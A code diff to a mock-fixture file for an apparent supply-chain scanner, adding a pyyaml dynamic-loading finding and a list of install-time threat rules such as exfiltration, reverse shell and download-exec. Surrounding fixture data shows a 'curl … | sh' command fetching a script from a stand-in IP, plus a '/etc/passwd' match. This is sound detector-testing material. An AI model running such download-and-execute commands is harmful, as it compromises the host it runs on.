@@ -351,6 +351,9 @@
   const P = (name, version, direct, vulns, source, manager = 'pip', ecosystem = 'PyPI') => ({ manager, name, version, ecosystem, source, direct, vulns });
   // 11/02 sg-vm 실측 — django==2.2.0 (requirements.txt 검사와 같은 값: 75건 · 최고 9.8) · psf/requests 저장소 테스트 코드의 /etc/passwd
   scanFixtures.osv['own:pip:django@2.2.0'] = [{ package: 'django', version: '2.2.0', ecosystem: 'PyPI', direct: true, count: 75, maxSeverity: '9.8', ids: ['PYSEC-2019-10', 'PYSEC-2019-11'] }];
+  // 11/03 판정 3단계: pyyaml 6.0.3 — 런타임 휴리스틱 규칙(동적 로딩)만 3곳인데 GuardDog 점수 8.8(11/02 sg-vm 실측) → 「주의」(악성 아님)
+  scanFixtures.guarddog['pip:pyyaml'] = { risk: { score: 8.8, label: 'high_risk' }, files: { 'lib/yaml/constructor.py': "    def find_python_module(self, name, mark):\n        if not name:\n            raise ConstructorError(...)\n        try:\n            __import__(name)\n        except ImportError as exc:\n            raise ConstructorError(...)\n        return sys.modules[name]\n" },
+    findings: [531, 551, 563].map((line) => ({ rule: 'threat-runtime-dynamic-loader', category: 'threat', message: '동적으로 코드를 불러와 실행', file: 'lib/yaml/constructor.py', line, match: '__import__(name)' })) };
   scanFixtures.tests = { 'repo:requests': [{ rule: 'threat-filesystem-read', category: 'threat', message: '민감 파일(자격 증명 · 설정 · 키) 접근', file: 'tests/test_requests.py', line: 1827, match: '/etc/passwd' }] };
   scanFixtures.packages = {
     'requirements.txt': [P('django', '3.2.0', true, 66, 'requirements.txt'), P('urllib3', '1.23.0', false, 24, 'requirements.txt'), P('requests', '2.19.0', true, 10, 'requirements.txt'),
@@ -369,5 +372,8 @@
       changes: [{ kind: 'C', path: '/root' }, { kind: 'A', path: '/tmp/p.sh' }, { kind: 'D', path: '/var/log/app.log' }],
       processes: [{ pid: 1, user: 'root', cmd: 'python3 -c import reqeusts' }, { pid: 47, user: 'root', cmd: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }, { pid: 48, user: 'root', cmd: 'curl -s http://203.0.113.7/p.sh' }], partial: false, durationMs: 214, error: '' }),
   };
-  window.MOCK = { scanFixtures, defaultRules, evidenceTemplate, isPublic, containers, attack, dnsExfil, DNS_EXFIL_NAME, mkTimeline, DEMO_SCENARIOS, demoEvents, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
+  // 설치 시점 규칙(11/03 판정 3단계, 백엔드 scan/verdict.go installTimeRules 와 같다) — threat-process-hooks 는 정상 setup.py 에도 흔해 넣지 않음
+  const INSTALL_TIME_RULES = ['threat-setup-', 'threat-npm-preinstall-script', 'threat-npm-dependency-confusion', 'threat-npm-http-dependency', 'threat-network-exfil', 'threat-network-dns-exfil', 'threat-network-reverse-shell', 'threat-process-download-exec', 'threat-runtime-self-propagation'];
+  const isInstallTimeRule = (rule) => INSTALL_TIME_RULES.some((p) => String(rule).startsWith(p));
+  window.MOCK = { scanFixtures, isInstallTimeRule, defaultRules, evidenceTemplate, isPublic, containers, attack, dnsExfil, DNS_EXFIL_NAME, mkTimeline, DEMO_SCENARIOS, demoEvents, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
 })();
